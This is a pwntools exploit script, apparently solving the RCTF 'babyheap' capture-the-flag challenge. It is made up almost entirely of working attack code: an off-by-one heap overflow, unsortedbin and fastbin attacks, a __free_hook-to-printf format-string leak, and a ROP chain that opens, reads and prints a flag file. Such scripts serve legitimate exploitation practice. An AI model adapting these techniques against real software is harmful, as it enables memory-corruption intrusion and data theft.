#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw",'-h']
if local :
    a=process("./babyheap")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("")
    libc=ELF("./libc-2.23.so")

elf=ELF("./babyheap")
def debug():
    gdb.attach(a,'''
b *(0x555555554000+0x000000000001103)
b *(0x555555554000+0x000000000001327)
b *(0x555555554000+0x000000000001240)
               ''')
#add,delete,edit
def menu(index):
    a.recvuntil("Choice: \n")
    a.sendline(str(index))
def add(size):
    menu(1)
    a.recvuntil("Size: ")
    a.sendline(str(size))
def edit(index,content):
    menu(2)
    a.recvuntil("Index: ")
    a.sendline(str(index))
    a.recvuntil("Content: ")
    a.send(content)
def delete(index):
    menu(3)
    a.recvuntil("Index: ")
    a.sendline(str(index))
def show(index):
    menu(4)
    a.recvuntil("Index: ")
    a.sendline(str(index))

add(0x18)#0    0
add(0x910)#1   0x20
add(0x100)#2   0x1c0
add(0x10)#3
edit(1,'A'*0x8f0+p64(0x900)+p64(0x81))#fake size
delete(1)
edit(0,'\x00'*0x18)#offbyone
add(0x10)#1    0x20
add(0x10)#4     0x40
add(0x8d8-0x20)#5   0x60    
delete(1)
delete(2)

add(0x10)#1   0x20
show(4)

libc_base = u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)
malloc_hook=libc_base+libc.symbols["__malloc_hook"]
fake_chunk=malloc_hook-0x23


add(0x20)#2
edit(2,'A'*0x10+p64(0)+p64(0x8d8-0x20+8+1))
free_hook=libc_base+libc.symbols["__free_hook"]
global_max_fast=libc_base+0x3c67f8

fake_file=p64(0)+p64(0x4e1)                                 
fake_file+='A'*8+p64(global_max_fast-0x10)    #unsortedbin attack 

edit(5,fake_file)
add(0x4d0) #6    0x70
edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21)+p64(0)+p64(0x21))
delete(6)
edit(5,p64(0)+p64(0x71)+p64(0x81))
add(0x68) # 6
edit(5,p64(0)+p64(0x81))
delete(6)
main_arena=libc_base+libc.symbols["__malloc_hook"]+0x10
fake_chunk=libc_base+0x3c4b50-0x8
success("fake_chunk_addr ==> 0x%x"%fake_chunk)
edit(5,p64(0)+p64(0x81)+p64(fake_chunk))
add(0x78)#6
add(0x78)#7 get fake_chunk

fake_top_chunk=0x3c5710+libc_base
payload='\x00'*0x20+p64(fake_top_chunk)+'\x00'*(0x10-8)
payload+=p64(libc_base+0x00007ffff7dd1b78-0x7ffff7a0d000)*2
edit(7,payload)  #恢复unsorted bin

edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21))
delete(6)
edit(5,p64(0)+p64(0x71)+p64(0))#恢复fastbin
add(0x68)#6 
#0x1098
add(0x100)#8
edit(8,p64(0)+p64(0x880))
edit(5,p64(0)+p64(0x881)+'A'*0x870+p64(0)+p64(0x21))
delete(6)

edit(5,p64(0)+p64(0x881)+p64(0x7ffff7dd2720-0x7ffff7a0d000+libc_base))
add(0x870)#6
add(0x870)#9 get fake_chunk
edit(9,'A'*0x860+p64(0)+p64(0x880))


edit(5,p64(0)+p64(0x881)+'A'*0x870+p64(0)+p64(0x21))
delete(6)
edit(5,p64(0)+p64(0x881)+p64(0x7ffff7dd2f90-0x7ffff7a0d000+libc_base))
add(0x870)#6
add(0x870)#10 get fake_chunk


printf_addr=libc_base+libc.symbols["printf"]
success("printf_addr ==> 0x%x"%printf_addr)
edit(10,'\x00'*0x808+p64(printf_addr))  #修改__free_hook ==> printf
#b *0x7ffff7a915e5
edit(0,'%9$p%8$p')  # 0xd74 
delete(0)
text_base=int(a.recv(14),16)-0xd74
success("text_base ==> 0x%x"%text_base)
stack_addr=int(a.recv(14),16)
success("stack_addr ==> 0x%x"%stack_addr)
fake_stack_chunk=stack_addr+0x40-0x8
success("fake_stack_chunk ==> 0x%x"%fake_stack_chunk)

edit(1,'%48c%18$lln')
delete(1)

ptr_addr=0x202110+text_base
success("ptr_addr ==> 0x%x"%ptr_addr)
edit(10,'\x00'*0x808+p64(0)+'\x00'*0x48+p64(0x12345678))#free_hook ==> 0
edit(5,p64(0)+p64(0x31)+'A'*0x20+p64(0)+p64(0x21))
delete(6)
edit(5,p64(0)+p64(0x30)+p64(fake_stack_chunk))
add(0x28)#0
add(0x28)#1 get fake chunk
edit(1,p64(ptr_addr+2))

edit(10,'\x00'*0x808+p64(printf_addr))# free_hook ==> printf
edit(2,"%23$sA")
delete(2)
mmap_addr='\x00\x00'+a.recvuntil("A",drop=True)
mmap_addr=u64(mmap_addr.ljust(8,'\x00'))
success("mmap_addr ==> 0x%x"%mmap_addr)

edit(10,'\x00'*0x808+p64(0))# __free_hook ==> 0
edit(5,p64(0)+p64(0x71)+'A'*0x60+p64(0)+p64(0x21))
delete(0)
edit(5,p64(0)+p64(0x71)+p64(mmap_addr+0x70))
add(0x68)#0
add(0x68)#2 get mmap , 修改8 ， 9 ， 10 。。。。
dest_addr=stack_addr+0x28

read_addr=libc_base+libc.symbols["read"]
open_addr=libc_base+libc.symbols["open"]
write_addr=libc_base+libc.symbols["write"]
pop_rdi_ret=text_base+0x1433
pop_rsi_r15_ret=text_base+0x1431
read_got=text_base+0x201F98
push_rax_ret=libc_base+0x00000000000348fd
pop_rsi_ret=libc_base+0x202e8
pop_rdx_ret=libc_base+0x1b92
pop_rdi_pop_rbp_ret=libc_base+0x20256
xchg_eax_edi_ret=libc_base+0x00000000000b0aa4
#ROP chain
payload=p64(pop_rdi_ret)
payload+=p64(dest_addr+18*8+0xd)
payload+=p64(pop_rsi_ret)
payload+=p64(0x4)
payload+=p64(open_addr)
payload+=p64(xchg_eax_edi_ret)
payload+=p64(pop_rsi_ret)
payload+='A'*0xd
payload+=p64(dest_addr+20*8)
payload+=p64(pop_rdx_ret)
payload+=p64(0x10)
payload+=p64(read_addr)
payload+=p64(pop_rdi_ret)
payload+=p64(1)
payload+=p64(pop_rsi_ret)
payload+=p64(dest_addr+20*8)
payload+=p64(pop_rdx_ret)
payload+=p64(0x10)
payload+=p64(write_addr)
payload+="/mnt/hgfs/Desktop/rctf/babyheap/flag\x00"
edit(2,p64(dest_addr)+p64(0x200)) 
edit(8,payload)#在返回地址处填入ROP
a.interactive()